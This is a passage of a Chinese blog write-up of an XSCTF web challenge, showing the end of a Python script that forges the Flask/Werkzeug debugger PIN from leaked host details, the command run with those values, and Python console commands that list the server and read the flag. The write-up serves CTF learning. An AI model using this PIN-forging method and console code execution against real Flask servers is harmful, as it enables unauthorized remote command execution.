class="built_in">help</span> = <span class="string">&quot;运行flask用户的用户名&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;--modname&#x27;</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, default = <span class="string">&quot;flask.app&quot;</span>, <span class="built_in">help</span> = <span class="string">&quot;默认为flask.app&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;--appname&#x27;</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, default = <span class="string">&quot;Flask&quot;</span>, <span class="built_in">help</span> = <span class="string">&quot;默认为Flask&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--path&#x27;</span>, required = <span class="literal">True</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, <span class="built_in">help</span> = <span class="string">&quot;getattr(mod, &#x27;__file__&#x27;, None):flask包中app.py的路径&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-M&#x27;</span>, <span class="string">&#x27;--MAC&#x27;</span>, required = <span class="literal">True</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, <span class="built_in">help</span> = <span class="string">&quot;MAC地址&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--machineId&#x27;</span>, <span class="built_in">type</span> = <span class="built_in">str</span>, default = <span class="string">&quot;&quot;</span>, <span class="built_in">help</span> = <span class="string">&quot;机器ID&quot;</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line"></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        args.username,</span><br><span class="line">        args.modname,</span><br><span class="line">        args.appname,</span><br><span class="line">        args.path</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        macToInt(args.MAC),</span><br><span class="line">        <span class="built_in">bytes</span>(args.machineId, encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">    md5Pin = getMd5Pin(probably_public_bits, private_bits)</span><br><span class="line">    sha1Pin = getSha1Pin(probably_public_bits, private_bits)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Md5Pin:  &quot;</span> + md5Pin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sha1Pin:  &quot;</span> + sha1Pin)</span><br></pre></td></tr></table></figure>
+<p>向终端传入参数。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python 计算PIN_2.py -u xsctf -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 02:42:ac:1e:00:02 -i 6e1d32ebf38c587c4a41089c0c744c83</span><br></pre></td></tr></table></figure>
+<p>计算结果如下，其中sha1的计算结果为：890-921-121</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106153806563.png" alt="image-20231106153806563" /></p>
+<p>进入控制台，可以访问<code>/console</code>或者点击报错调试页面右边的那个黑格子，输入PIN码。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106155043435.png" alt="image-20231106155043435" /></p>
+<p>登录成功，执行命令。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;app.py\nstatic\ntemplates\nuploads\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;Fffff111114444gggggg\napp\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmed  </span></span><br><span class="line"><span class="string">&gt;&gt;&gt; os.popen(&#x27;</span>cat /Fffff111114444gggggg<span class="string">&#x27;).read()</span></span><br><span class="line"><span class="string">&#x27;</span>XSCTF&#123;oh_mY_d2bug93r_M0de_!&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>
+<p>得到flag<code>XSCTF&#123;oh_mY_d2bug93r_M0de_!&#125;</code>。</p>
+<h2 id="后话"><a class="markdownIt-Anchor" href="#后话"></a> 后话</h2>
+<p>当时在线下赛时，被这个flask算PIN折磨的几乎崩溃，没有吃透源码被博客坑惨了。而且出题人也玩了一手阴招，并没有按照Python版本的规律出题。导致我思路全对却因为一直采用的是md5加密而无法计算出正确的PIN值。</p>
+<p>其实这题很简单，只要有Flask的debug模式+任意文件读取就可以做。</p>
+<h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.hz2016.com/2023/07/flask%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8Fpin%E5%80%BC%E8%AE%A1%E7%AE%97%E5%92%8C%E5%88%A9%E7%94%A8/">Flask调试模式PIN值计算和利用 - 正汰的学习笔记 (hz2016.com)</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg" alt="300342" /></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Adam Ben</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/posts/17f3e1f6f317/">http://example.com/posts/17f3e1f6f317/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Adam8enの8log</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/">目录穿越</a><a class="post-meta__tags" href="/tags/%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96/">任意读取</a></div><div class="post_share"><div class="social-share" data-image="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/4f880ad35e0e/" title="PHP碎碎念（二）——文件读取基础"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300483.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PHP碎碎念（二）——文件读取基础</div></div></a></div><div class="next-post pull-right"><a href="/posts/e69cb496aa79/" title="数据结构什锦（五）——树：线索二叉树"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2086464994_p0.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">数据结构什锦（五）——树：线索二叉树</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/ceeb5ee39cd9/" title="2023XSCTF初赛部分WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300008.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-18</div><div class="title">2023XSCTF初赛部分WP</div></div></a></div><div><a href="/posts/e7a35b1664fc/" title="CTFer的苦痛之路——SQL注入篇"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2062841026_p0.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-18</div><div class="title">CTFer的苦痛之路——SQL注入篇</div></div></a></div><div><a href="/posts/4ecd645b2fe8/" title="easy_md5のWP——SQL下的弱类型比较"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/AceAttorneyArtGallery.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-20</div><div class="title">easy_md5のWP——SQL下的弱类型比较</div></div></a></div><div><a href="/posts/5dc661771ecb/" title="PHP的RCE问题集锦"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/c74d52864acadc32631ab8b75a6cb15.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-04</div><div class="title">PHP的RCE问题集锦</div></div></a></div><div><a href="/posts/6a364d742574/" title="2024XYCTFの部分wp详解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/83776a4079fc052d284173c78b0c838c.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-27</div><div class="title">2024XYCTFの部分wp详解</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Adam Ben</div><div class="author-info__description">你的孤独与月为伴，你的深情与星同归</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Adam8en"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Adam8en" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:adamben@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/Adam_Ben?type=blog" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=2813879949&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">不知道说什么好,放个表情包在这里好了,⁽˙³˙⁾◟(๑•́ ₃ •̀๑)◞⁽˙³˙⁾</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 序言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpin%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text"> 什么是PIN码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pin%E7%A0%81%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90"><span class="toc-number">1.2.</span> <span class="toc-text"> PIN码如何生成</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96username"><span class="toc-number">2.</span> <span class="toc-text"> 获取username</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96modname"><span class="toc-number">3.</span> <span class="toc-text"> 获取modname</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96appname"><span class="toc-number">4.</span> <span class="toc-text"> 获取appname</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96moddir"><span class="toc-number">5.</span> <span class="toc-text"> 获取moddir</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96uuidnode"><span class="toc-number">6.</span> <span class="toc-text"> 获取uuidnode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96machine_id"><span class="toc-number">7.</span> <span class="toc-text"> 获取machine_id</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97pin%E8%8E%B7%E5%BE%97flag"><span class="toc-number">8.</span> <span class="toc-text"> 计算PIN&amp;获得flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AF%9D"><span class="toc-number">9.</span> <span class="toc-text"> 后话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">10.</span> <span class="toc-text"> 参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/1c2342ee510b/" title="计算机组成指北（七）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/C10AD1752A521C3C297E7D81400952F1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="计算机组成指北（七）"/></a><div class="content"><a class="title" href="/posts/1c2342ee510b/" title="计算机组成指北（七）">计算机组成指北（七）</a><time datetime="2024-09-27T03:43:26.000Z" title="发表于 2024-09-27 11:43:26">2024-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4ddedbf342f8/" title="计算机组成指北（六）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/612FFB2DEDE35B9C77545DB9ADF1C8BF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="计算机组成指北（六）"/></a><div class="content"><a class="title" href="/posts/4ddedbf342f8/" title="计算机组成指北（六）">计算机组成指北（六）</a><time datetime="2024-09-27T03:43:17.000Z" title="发表于 2024-09-27 11:43:17">2024-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/159e2ded72f9/" title="计算机组成指北（五）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/105468887_p0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="计算机组成指北（五）"/></a><div class="content"><a class="title" href="/posts/159e2ded72f9/" title="计算机组成指北（五）">计算机组成指北（五）</a><time datetime="2024-09-27T03:43:08.000Z" title="发表于 2024-09-27 11:43:08">2024-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f96ae6cd0b44/" title="计算机组成指北（四）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/B457C9EC79F0421BB773651E8FFE5F05.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="计算机组成指北（四）"/></a><div class="content"><a class="title" href="/posts/f96ae6cd0b44/" title="计算机组成指北（四）">计算机组成指北（四）</a><time datetime="2024-09-27T03:42:55.000Z" title="发表于 2024-09-27 11:42:55">2024-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1da683a19632/" title="计算机组成指北（三）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/118769966_p0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="计算机组成指北（三）"/></a><div class="content"><a class="title" href="/posts/1da683a19632/" title="计算机组成指北（三）">计算机组成指北（三）</a><time datetime="2024-09-27T03:42:38.000Z" title="发表于 2024-09-27 11:42:38">2024-09-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Adam Ben</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js"></script><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addModeChange('mermaid', runMermaid)
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '07g7RVgbp0tb6j6gBjcZCTKv-gzGzoHsz',
+      appKey: '4w4tpzByVtxnDriO8BFDKLBt',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
